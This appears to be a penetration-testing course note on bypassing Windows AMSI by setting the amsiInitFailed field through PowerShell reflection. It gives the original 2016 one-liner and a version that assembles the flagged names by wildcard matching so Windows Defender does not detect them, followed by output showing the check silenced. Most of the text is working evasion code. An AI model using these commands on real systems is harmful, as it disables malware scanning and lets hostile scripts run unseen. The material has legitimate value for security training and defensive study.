# 06.04 AMSI Bypass amsiInitFailed via Dynamic Reflection

> Section 7.3.2 · Matt Graeber 2016 · dynamic field discovery

## Overview

Setting the amsiInitFailed field to $true causes AmsiOpenSession to return E_INVALIDARG (same code path as the header corruption). The original one-liner from Matt Graeber (2016) hard-codes 'AmsiUtils' and 'amsiInitFailed' — both strings are now flagged by Windows Defender. The technique still works if both strings are constructed dynamically using the same GetTypes/GetFields loop pattern as the amsiContext bypass.

## Steps

- **Original bypass** — `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` — still works but 'AmsiUtils' and 'amsiInitFailed' literals are flagged.
- **Dynamic version** — loop GetTypes() for `*iUtils`, then loop GetFields() for `*InitFailed`; call SetValue($null, $true).
- **Same effect** — either bypass silences AMSI for the lifetime of the PowerShell session.

## Commands

### Original amsiInitFailed

```powershell
# Matt Graeber (2016) — 'AmsiUtils' and 'amsiInitFailed' substrings now flagged by Defender
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Dynamic version — avoids flagged strings

```powershell
# Reuse the GetTypes/GetFields loop pattern to avoid 'AmsiUtils' and 'amsiInitFailed' literals
$a=[Ref].Assembly.GetTypes()
Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
$d=$c.GetFields('NonPublic,Static')
Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}}
$f.SetValue($null,$true)

PS C:\Users\Offsec> 'amsiutils'
amsiutils
```
